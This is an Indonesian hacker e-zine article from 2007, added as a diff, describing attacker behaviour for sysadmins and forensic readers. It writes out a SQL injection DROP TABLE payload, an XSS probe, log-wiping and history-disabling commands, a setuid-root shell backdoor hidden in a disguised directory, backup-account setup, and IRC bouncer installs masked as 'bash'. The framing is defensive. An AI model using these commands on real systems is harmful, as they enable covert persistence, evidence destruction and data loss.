@@ -1,0 +1,526 @@
+####################################################################
+TOKET - Terbitan Online Kecoak Elektronik
+Defending the classical hackers mind since 1995
+
+Publisher : http://www.kecoak-elektronik.net
+Contact	  : staff@kecoak-elektronik.net
+####################################################################
+
+
+Subject   : Mata Hari
+Writer    : scut of Kecoak Elektronik
+Contact   : scut@k-elektronik.nl
+Style     : Unicode Transformation Format (UTF-8)
+
+
+--[1]-- Kecoak Elektronik License
+
+Kecoak Elektronik secara aktif mendukung Blue Ribbon Campaign.
+Kami akan berusaha untuk menerbitkan semua informasi yang kami anggap
+patut diketahui, baik dokumen teks, artikel majalah, atau surat kabar.
+Seluruh kredit akan diberikan kepada sang pengarang.
+
+Kecoak Elektronik tidak bertanggung jawab atas tindakan orang lain.
+Informasi yang disajikan di situs ini adalah untuk tujuan pendidikan
+dan informasionil belaka. Jika Anda memutuskan untuk mengejawantahkan
+dalam bentuk apapun informasi yang tersimpan di situs ini, Anda
+melakukan atas keputusan sendiri, dan tidak seorangpun selain Anda
+bertanggung jawab atas tindakan tersebut.
+
+Dipersilahkan untuk mengambil sebagian atau seluruh dari isi artikel
+yang kami terbitkan dengan tetap mencantumkan kredit atas pengarang
+dan Kecoak Elektronik sebagai penerbit online. Artikel yang dikutip
+atau diambil tidak dapat dipergunakan untuk kepentingan komersil.
+
+
+--[2]-- Intro
+
+Mungkin sebagian pembaca bertanya kenapa artikel ini menggunakan
+judul yang cukup unik atau bahkan tidak bersinggungan secara langsung
+dengan komputer dan Internet. Mata Hari adalah salah satu mata-mata
+yang sangat terkenal di era Perang Dunia I. Mata Hari terlahir dengan
+nama Margaretha Geertruida Zellemen dan sebagai spionase untuk dua
+negara yang berbeda yang saling bermusuhan.
+
+Mata Hari menjadi salah satu inspirasi saya dalam melakukan kegiatan
+social engineering dan machine engineering, dimana teknik spionase
+digunakan untuk mempelajari trend-trend yang digunakan oleh Attacker
+dalam melakukan penyusupan kedalam system, pencurian data, atau
+melakukan tindakan yang patut kita cermati bersama.
+
+Mata Hari adalah seorang Double Agent, demikian juga saya sebagai
+Double Character. Di satu sisi sebagai attacker yang mempelajari
+kebiasaan attacker lainnya didalam sebuah system, sedangkan
+di sisi lainnya memposisikan sebagai sysadmin yang memanfaatkan
+pola penyerangan yang dilakukan oleh Attacker yang lainnya, yang
+diharapkan hasil dari investigasi tersebut bermanfaat bagi saya
+atau siapapun yang membacanya untuk melakukan digital forensic
+dan tindakan prefentif.
+ 
+Tujuan dari penulisan artikel ini adalah untuk memberikan pengenalan
+terhadap metode-metode penyerangan yang dilakukan oleh Attacker juga
+memberikan gambaran terhadap apa yang sering dilakukan sehingga
+diharapkan dapat memberikan security warning kepada siapapun yang
+telah membaca artikel ini.
+
+"This World is Watching Me" -- Armin Van Buuren ft. Nadia Ali
+
+ 
+--[2.1]-- Global Trend Attacks
+
+SQL Injection dan XSS Attack (Cross Site Scripting) nampaknya adalah
+salah satu teknik penyerangan yang paling populer yang digunakan saat
+ini. Tentunya yang menjadi prioritas dalam teknik ini adalah situs
+e-commerce yang mempunyai celah keamanan disisi web yang salah satu
+tujuannya adalah mencuri kartu kredit yang terdapat dalam order log
+situs tersebut, namun tidak jarang yang melakukan hanya sekedar
+melakukan defacement dihalaman INDEX sebuah website.
+
+Penyerang menggunakan SQL Injection untuk menyisipkan perintah SQL
+didalam form yang digunakan untuk menyisipkan perintah SQL seperti
+login form. Contoh sederhananya adalah:
+
+-----------------------------------------------------------------------
+"SELECT password FROM user WHERE login = '$user_login'"
+-----------------------------------------------------------------------
+
+Apabila tidak dilakukan validasi terhadap string, maka cracker dapat
+memasukkan string "'something' ; DROP TABLE user"
+
+Sehingga web server yang akan mengirimkan perintah SQL:
+
+-----------------------------------------------------------------------
+"SELECT password FROM user WHERE login = 'something'; DROP TABLE user"
+-----------------------------------------------------------------------
+
+Dalam contoh di atas, sebuah website dapat kehilangan tabel user
+secara keseluruhan, dan masih banyak contoh-contoh instant untuk
+attacking sebuah website menggunakan teknik tersebut. Sampai saat
+ini masih banyak situs-situs yang belum melakukan perbaikan terkait
+dengan masalah ini.
+
+Terkadang Attacker juga melakukan input login dan password kedalam
+sebuah website dengan string-string default SQL Injection dibawah ini
+
+XSS Attack memanfaatkan form yang disediakan untuk memasukkan text
+dalam database, pada saat text tersebut dibuka maka bila Administrator
+tidak melakukan validasi text yang masuk kedalam database, maka
+tampilan dalam sebuah website dapat dikendalikan oleh Attacker.
+Contoh sederhana dapat dilihat dari contoh dibawah ini.
+
+-----------------------------------------------------------------------
+<script>alert('Learning XSS Attack');</script>
+-----------------------------------------------------------------------
+
+Apabila saat diakses terdapat window alter dengan pesan tersebut,
+dapat dipastikan website tersebut tidak terlindungi dari serangan
+XSS Attack. Sebelum memutuskan untuk meluncurkan sebuah website
+di Internet, hendaknya sang Administrator melakukan auditing terhadap
+serangan yang memanfaatkan kedua metode diatas. Apalagi situs-situs
+yang didalamnya memuat data-data penting yang sifatnya confidental.
+
+Bacaan yang disarankan untuk topik diatas adalah:
+
+01. http://en.wikipedia.org/wiki/SQL_injection
+02. http://en.wikipedia.org/wiki/XSS
+
+
+--[2.2]-- What Happen With Exploiting?
+
+Keadaan yang drastis berbeda adalah ketika exploit-exploit yang
+melakukan penyerangan secara remote mulai hilang dari peredaran,
+pada awal 1997 sampai tahun 2002 mungkin adalah masa-masa keemasan
+penyerangan dengan menggunakan bantuan remote exploit, meskipun saat
+ini juga masih beredar walaupun dengan jumlah yang relatif menurun.
+Menggunakan bantuan remote exploit ataupun local exploit yang dikenal
+dengan nama lain Zer0day (0day) sangat banyak digunakan dengan asumsi
+kebanyakan exploit tersebut langsung mendapatkan akses tertinggi
+dalam sebuah server.
+
+Karena dirasa sudah mulai sulit untuk mendapatkan remote exploit yang
+langsung melakukan exploitasi terhadap system untuk mendapatkan akses
+tertinggi dalam sebuah system, Attacker masih cenderung bertahan
+dengan menggunakan exploit-exploit lama atau dengan menggunakan
+remote mass exploit atau exploit yang dirancang sedemikian rupa
+yang berbentuk paket-paket remote exploit yang bekerja secara massal.
+
+Remote mass exploit yang sampai saat ini sering digunakan adalah
+mass exploit dengan nama "Massplo", dan "Massplor", yang dibuat
+oleh salah satu anggota Kecoak; Cahcephoe dan DeGleng yang
+memanfaatkan kombinasi bugs seperti "rpc", "bind", "openssl", "ssh",
+"samba". dan lain sebagainya. Tools tersebut sering digunakan karena
+tidak membutuhkan kemampuan khusus dalam melakukan penyerangan.
+Sang Attacker hanya perlu melakukan compiling terhadap mass exploit
+dan tinggal menjalankannya. Adapun jenis yang lain adalah produk dari
+"Metasploit Framework" yang merupakan sebuah project dari H.D Moore.
+
+Beberapa portal yang menyediakan exploit-exploit lainnya adalah:
+
+01. Packetstorm - http://www.packetstormsecurity.org
+02. Milw0rm - http://www.milw0rm.com
+03. Securiteam - http://www.securiteam.com
+
+
+--[2.3]-- Perilaku Attacker Terhadap Server
+
+Setelah berhasil menyusup kedalam system, kebiasaan yang pertama
+dilakukan adalah berusaha untuk menyembunyikan log dengan cara
+menghapus secara desdruktif log-log yang terdapat didalam sebuah
+system. Ilustrasi penghapusan file-file tersebut sering dilakukan
+dengan metode dibawah ini:
+
+-----------------------------------------------------------------------
+[root@localhost]# rm -rf .bash_history
+[root@localhost]# touch .bash_history
+[root@localhost]# chmod 600 .bash_history
+[root@localhost]# chattr +i .bash_history
+
+[root@localhost]# rm -rf /var/run/utmp
+[root@localhost]# rm -rf /var/log/wtmp
+[root@localhost]# rm -rf /var/log/lastlog
+[root@localhost]# rm -rf /var/log/messages
+[root@localhost]# rm -rf /var/log/secure
+[root@localhost]# rm -rf /var/log/maillog
+[root@localhost]# rm -rf /var/log/xferlog
+
+[root@localhost]# touch /var/run/utmp
+[root@localhost]# touch /var/log/wtmp
+[root@localhost]# touch /var/log/lastlog
+[root@localhost]# touch /var/log/messages
+[root@localhost]# touch /var/log/secure
+[root@localhost]# touch /var/log/maillog
+[root@localhost]# touch /var/log/xferlog
+
+[root@localhost]# chmod 600 /var/run/utmp
+[root@localhost]# chmod 600 /var/log/wtmp
+[root@localhost]# chmod 600 /var/log/lastlog
+[root@localhost]# chmod 600 /var/log/messages
+[root@localhost]# chmod 600 /var/log/secure
+[root@localhost]# chmod 600 /var/log/maillog
+[root@localhost]# chmod 600 /var/log/xferlog
+
+[root@localhost]# chattr +i /var/run/utmp
+[root@localhost]# chattr +i /var/log/wtmp
+[root@localhost]# chattr +i /var/log/lastlog
+[root@localhost]# chattr +i /var/log/messages
+[root@localhost]# chattr +i /var/log/secure
+[root@localhost]# chattr +i /var/log/maillog
+[root@localhost]# chattr +i /var/log/xferlog
+
+[root@localhost]# echo "unset HISTFILE" >> .bash_profile
+[root@localhost]# echo "unset USERNAME" >> .bash_profile
+[root@localhost]# echo "unset HISTSIZE" >> .bash_profile
+-----------------------------------------------------------------------
+
+Melakukan perubahan secara fundamental terhadap log-log yang terdapat
+didalam system tersebut diharapkan dalam menghilangkan jejak dengan
+asumsi semua log-log telah dihapus. Apakah hal tersebut dapat
+dibenarkan? Tentu saja tidak, Attacker mungkin lupa bahwa mungkin
+sysadmin melakukan pencatatan melalui Intrusion Detection System atau
+apabila keadaan sangat mendesak dan sysadmin dituntut untuk melakukan
+cyber forensic, log-log yang sudah terhapus tersebut dapat dilakukan
+pembalikan (restore) seperti keadaan sebelum dilakukan penyusupan.
+
+Jadi jangan heran apabila kebetulan Anda sebagai sysadmin ketika
+melakukan pemeriksaan terhadap log-log tetapi menemukan bahwa semua
+log telah terhapus, dapat dipastikan Anda menjadi korban dari
+perbuatan tersebut. Ternyata perilaku Attacker tidak berhenti sampai
+di situ saja, langkah yang kedua adalah melakukan instalasi backdoor.
+
+Sayangnya backdoor yang dipilih termasuk backdoor yang susah untuk
+dilakukan perbaikan terhadap system yang terinstall. Lagi-lagi
+Attacker memilih instant backdoor yang tidak memerlukan skill yang
+khusus dalam melakukan teknik backdooring ini. Backdoor yang paling
+sering digunakan adalah "SHV4", "SHV5", dan "SHV7". Ciri khas dari
+backdoor diatas adalah menginfeksi file-file binary didalam system
+kemudian membuka port untuk melakukan koneksi kedalam system melalui
+daemon SSHD. Selain itu ada juga yang menggunakan backdoor "BindTTY"
+dan "OpenSSH Backdoor".
+
+Cracking terhadap /etc/shadow atau /etc/master.passwd adalah juga
+tindakan yang wajib dilakukan oleh si Attacker, mengingat mereka
+sadar suatu saat sysadmin akan melakukan perbaikan terhadap system
+sehingga backdoor yang sudah dipasang tidak dapat berjalan lagi.
+Tools yang sering digunakan adalah "John The Ripper" yang dapat
+didownload secara gratis di situs http://www.openwall.com
+
+Setelah melakukan backdooring nampaknya belum cukup memberikan
+kepuasan kepada Attacker untuk meninggalkan system yang telah berhasil
+dilakukan penetrasi, biasanya mereka menyiapkan account cadangan untuk
+menyikapi kejadian mendadak, misalnya backdoor langsung ketahuan oleh
+sysadmin, atau hal-hal lain yang tidak dikehendaki oleh Attacker.
+Biasanya Attacker memilih user dengan nama "sshd", "mysql", "rpm",
+"apache", "www", "nobody" untuk dimanfaatkan sebagai cadangan.
+
+Perilaku yang dilakukan terhadap user-user tersebut dapat Anda lihat
+melalui ilustrasi dibawah ini:
+
+-----------------------------------------------------------------------
+[root@localhost]# chsh -s /bin/bash sshd
+[root@localhost]# chsh -s /bin/bash mysql
+[root@localhost]# chsh -s /bin/bash rpm
+[root@localhost]# chsh -s /bin/bash apache
+[root@localhost]# chsh -s /bin/bash www
+[root@localhost]# chsh -s /bin/bash nobody
+
+[root@localhost]# passwd sshd
+[root@localhost]# passwd mysql
+[root@localhost]# passwd rpm
+[root@localhost]# passwd apache
+[root@localhost]# passwd www
+[root@localhost]# passwd nobody
+
+[root@localhost]# chattr +i /etc/passwd
+[root@localhost]# chattr +i /etc/shadow
+-----------------------------------------------------------------------
+
+Kedua perintah terakhir tersebut tentunya sangat naif apabila dilakukan,
+mengingat tidak hanya user tersebut yang tidak bisa melakukan perubahan
+password, tetapi apabila sysadmin ingin merubah password juga tidak bisa.
+Hal tersebut tentunya akan menambah kecurigaan bagi sysadmin bahwa
+system yang telah dia kelola telah tersusupi oleh orang lain. Tapi itulah
+perilaku yang umum dilakukan, membuat segala sesuatu dengan desdruktif
+tanpa mengetahui resiko yang akan diperoleh.
+
+Setelah melakukan pemodifikasian terhadap user-user diatas, Attacker
+membuat sebuah code untuk gaining akses melalui user tersebut. Bagaimana
+caranya? Simak ilustrasi dibawah ini
+
+Pertama, Attacker membuat simple code seperti dibawah ini yang akan
+disimpan dengan nama "test.c" didalam direktori /usr/share/vim/"..."
+-----------------------------------------------------------------------
+main()  { setuid(0); setgid(0); system("/bin/bash");
+ }
+-----------------------------------------------------------------------
+CATATAN: Jenis shell didalam code diatas dapat dirubah sesuai dengan
+         kebutuhan, contohnya /bin/sh /bin/tcsh dsb.
+
+Gambaran tersebut dapat disimak melalui ilustrasi dibawah ini
+-----------------------------------------------------------------------
+[root@localhost]# mkdir /usr/share/vim/"..."
+[root@localhost]# chmod 777 /usr/share/vim/"..."
+[root@localhost]# cd /usr/share/vim/"..."
+[root@localhost]# gcc -o test test.c
+[root@localhost]# chown 0:0 test
+[root@localhost]# chmod 7777 test
+[root@localhost]# su nobody
+nobody@localhost:/root> cd /usr/share/vim/"..."
+nobody@localhost:/usr/share/vim/...> ./test
+nobody@localhost:/usr/share/vim/...> id
+uid=0(root) gid=0(root) groups=65533(nobody),65534(nogroup) 
+-----------------------------------------------------------------------
+
+Setelah hal tersebut berhasil dilakukan, dan apabila backdoor utama
+telah terdeteksi oleh sysadmin, Attacker dapat dengan mudah melakukan
+gaining root dengan menggunakan login user diatas kemudian mengeksekusi
+file yang sudah dimodifikasi sedemikian rupa tersebut. w00t!
+
+Hal lain yang sering juga dilakukan adalah melakukan instalasi bouncher
+dan eggdrop untuk keperluan IRC, bouncher yang paling sering dipasang
+adalah BNC, ezbounce, atau psyBNC. Dengan memanfaatkan proses faker
+Attacker berharap sysadmin tidak bisa melakukan pendeteksian terhadap
+bouncher yang telah berhasil di install. Ilustrasi terhadap pola diatas
+dapat dilihat melalui ilustrasi dibawah ini:
+
+Berusaha membuat direktori tersembunyi
+-----------------------------------------------------------------------
+[root@localhost]# mkdir /tmp/"..."
+-----------------------------------------------------------------------
+
+Melakukan instalasi oidentd didalam server
+-----------------------------------------------------------------------
+[root@localhost]# cd /tmp/"..."
+[root@localhost]# wget http://www.somesites.com/oidentd-2.0.8.tar.gz
+[root@localhost]# tar -zxvf oidentd-2.0.8.tar.gz
+[root@localhost]# cd oidentd-2.0.8
+[root@localhost]# ./configure; make; make install
+-----------------------------------------------------------------------
+
+Membuat file /etc/oidentd.conf dengan konfigurasi seperti dibawah ini
+-----------------------------------------------------------------------
+default {
+        default {
+                deny spoof
+                deny spoof_all
+                deny spoof_privport
+                allow random_numeric
+                allow numeric
+                allow hide
+        }
+}
+user root {
+        default {
+                force reply "hacker"
+        }
+}
+-----------------------------------------------------------------------
+
+Menjalankan oidentd
+-----------------------------------------------------------------------
+[root@localhost]# /usr/sbin/oidentd -C /etc/oidentd.conf
+[root@localhost]# cd ..
+-----------------------------------------------------------------------
+
+CATATAN: Biasanya setiap instalasi yang dilakukan didalam system
+	 Attacker selalu menggunakan fake process, sehingga seakan-akan
+         system masih dalam keadaan yang semula.
+
+
+Melakukan instalasi psyBNC didalam server
+-----------------------------------------------------------------------
+[root@localhost]# wget http://www.somesites.com/psyBNC-2.3.2-7.tar.gz
+[root@localhost]# tar -zxvf psyBNC-2.3.2-7.tar.gz
+[root@localhost]# mv psybnc "..."
+[root@localhost]# cd "..."
+[root@localhost]# make
+-----------------------------------------------------------------------
+
+Melakukan proses penyembunyian PID
+-----------------------------------------------------------------------
+[root@localhost]# mv psybnc "bash"
+[root@localhost]# mv psybnc.conf "   "
+[root@localhost]# PATH=$PATH:/tmp/"..."/"..."/
+[root@localhost]# "bash" "   "
+-----------------------------------------------------------------------
+CATATAN: Attacker juga sering menggunakan tools untuk process faker.
+
+Asumsi diatas dilakukan untuk memperoleh kesan ketika dilakukan
+pemeriksaan proses didalam server, maka proses yang nampak untuk user
+yang dilakukan instalasi psyBNC adalah "bash". Sekali lagi hal
+tersebut sangatlah naif dilakukan oleh Attacker. Bersyukur apabila
+system yang telah berhasil dimasuki tidak digunakan untuk DDoS atau
+Distributed Denial of Service Attack, apabila system tersebut digunakan
+untuk kegiatan tersebut, celakalah bagi sysadmin yang kebetulan tidak
+beruntung.
+
+Bagi Attacker yang mempunyai kemampuan untuk social engineering dan
+machine engineering, biasanya akan memanfaatkan teknik tersebut untuk
+melakukan pencurian data, Attacker mengetahui bahwa sebagian besar
+orang cenderung malas untuk memberikan perlakuan yang istimewa terhadap
+password dengan kata lain, password yang digunakan didalam system
+akan sama untuk password yang digunakan didalam email atau system-system
+lainnya. Dengan kata lain, Attacker cenderung melakukan ujicoba untuk
+menebak password email, server yang berkaitan dengan network yang
+berhasil dilakukan penyusupan atau akses-akses lainnya. Tentunya hal
+tersebut sangat merugikan mengingat informasi-informasi yang mungkin
+disimpan didalam system atau email adalah informasi yang sifatnya
+adalah confidental information.
+
+Alternatif terakhir yang pernah saya jumpai ketika melakukan digital
+forensic adalah Attacker sering melakukan tindakan yang sangat merugikan
+bagi pengelola system, yaitu dengan menghapus seluruh isi data didalam
+system. Penghapusan seluruh file tersebut dilakukan apabila Attacker
+merasa menemukan kesulitan dalam pemodifikasian system sehingga timbul
+perasaan kecewa sehingga tanpa mempedulikan etika dan moral mereka
+melakukan penghapusan terhadap seluruh data didalam system.
+
+
+--[2.4]-- Scam, Spam, dan Pishing
+
+Tidak dipungkiri aktifitas tersebut termasuk didalam aktifitas yang
+melanggar hukum. Mengingat pelaku dengan segaja melakukan kegiatan untuk
+menipu orang lain dengan tujuan memperoleh data dan informasi penting
+atau rahasia untuk tujuan komersial. Yang menjadi sasaran dari kegiatan
+tersebut adalah website penyedia transaksi keuangan seperti "Paypal",
+"Ebay", "Visa", "Mastercard", dan lain sebagainya.
+
+Pelaku biasanya membuat situs yang serupa dengan situs asli dari pihak
+penyedia transaksi keuangan tersebut kemudian melakukan pengiriman
+massal melalui media email yang didalamnya berisikan pesan untuk melakukan
+verifikasi account kedalam situs yang dibuat serupa dengan tujuan untuk
+mendapatkan akses login, kartu kredit, atau hal-hal yang berkaitan dengan
+Internet fraud. Pesan yang tertera didalam email biasanya disertai dengan
+teknik spoofing domain yang memberikan kesan bahwa alamat domain yang
+dikirimkan didalam email adalah benar-benar dari pihak resmi penyedia
+transaksi keuangan tersebut.
+
+Pemerintah Indonesia yang dalam hal ini adalah Kepolisian juga melakukan
+tindakan tegas terhadap pelaku scam dalam bentuk lain. Seperti berpura-pura
+membuat situs e-commerce dengan menjual produk-produk elektronik dengan
+harga yang jauh dibawah rata-rata untuk menjaring minat konsumen membeli
+produk (fiktif) didalam situs yang mereka buat. Modus operandinya adalah
+ketika konsumen yang terjebak untuk membeli barang kedalam situs tersebut
+maka pelaku tidak akan pernah mengirimkan barang yang telah dibeli.
+Biasanya pelaku juga membuat Kartu Tanda Penduduk fiktif untuk membuat
+account bank dengan nama yang fiktif pula, hal tersebut dilakukan untuk
+mencoba mengelabuhi pihak bank sehingga transaksi yang dilakukan
+menggunakan rekening fiktif tersebut sulit untuk dilacak keberadannya.
+
+
+--[3]-- Kesimpulan
+
+Pola penyerangan yang dilakukan diatas tidak 100% mirip, tetapi minimal
+saya berharap pembaca dapat mengenal pola dasar yang umum digunakan
+oleh Attacker ketika berada didalam sebuah system. Inilah saatnya bagi
+Anda untuk belajar lebih dalam mengenai konsep psikologis atau hal-hal
+non teknis yang perlu diketahui. Sekali lagi penggunaan tools-tools
+untuk pendeteksian belumlah cukup tanpa di imbangi dengan pengetahuan
+di luar teknis lainnya. "There's no patch for human stupidity!".
+
+Tidak ada jaminan bahwa sebuah system yang telah diluncurkan di Internet
+adalah benar-benar aman sebelum dilakukan auditing secara menyeluruh.
+Juga tidak dibenarkan apabila selesai dilakukan auditing berasumsi bahwa
+system tersebut telah benar-benar aman 100%. Hal yang patut dilakukan
+oleh sysadmin adalah rajin mengikuti berita didalam mailing list sehingga
+dapat mengetahui dengan persis berbagai kejadian yang berkaitan dengan
+security dan juga patch-patch yang diterbitkan oleh vendor berkaitan
+dengan issue yang terbaru. Pergunakanlah analisis yang berkaitan dengan
+pemahaman psikologis disamping teknis, mengingat beberapa Attacker
+cenderung menggunakan pendekatan psikologis terhadap system yang
+menjadi sasaran penyerangan.
+
+Waspadai terhadap email yang datang didalam mailbox Anda yang menawarkan
+sesuatu yang menggiurkan, usahakan tetap berusaha melakukan konfirmasi
+dengan penyedia jasa keuangan yang mungkin dalam hal ini adalah pihak
+bank untuk menanyakan kebenarannya. Ingat, pihak penyedia jasa keuangan
+manapun tidak pernah menanyakan detail account Anda melalui email.
+
+Lakukan update secara teratur kedalam system Anda, baik itu anti virus,
+firewall, atau beberapa service yang terdapat vulnerable dengan versi
+yang sudah stabil. Tutup beberapa port yang tidak perlu dan juga
+terapkan security policy didalam network yang Anda kelola.
+
+Tools yang disarankan untuk melakukan auditing adalah:
+
+01. Nessus
+    http://www.nessus.org
+02. Metaploit Project
+    http://www.metasploit.com
+03. Backtrack
+    http://www.remote-exploit.org
+04. Operator
+    http://www.ussysadmin.com/operator
+05. Phlak
+    http://www.phlak.org/modules/mydownloads
+06. Auditor
+    http://www.remote-exploit.org/index.php/Auditor_mirrors
+07. L.A.S Linux
+    http://www.localareasecurity.com/download
+08. Knoppix STD
+    http://www.knoppix-std.org/download.html
+09. Helix
+    http://www.e-fense.com/helix
+10. F.I.R.E
+    http://fire.dmzs.com
+11. nUbuntu
+    http://www.nubuntu.org/downloads.php
+12. INSERT
+    http://www.inside-security.de/insert_en.html
+
+
+ .oO Knock! Knock! Kecoak Pirates still alive, open your eyes!
+
+
+--[4]-- Referensi
+
+1. Artikel ini tidak mempunyai referensi, mengingat segala tulisan adalah
+   berdasarkan atas pengalaman pribadi dalam melakukan digital forensic.
+
+
+
+Sarang Kecoak, Mon Apr 16 02:59:11 WIT 2007
+scut <scut@k-elektronik.nl>
+-----------------------------------------------------------------------
+Copyleft Unreserved by Law 1995 - 2007 Kecoak Elektronik Indonesia
+http://www.kecoak-elektronik.net
+
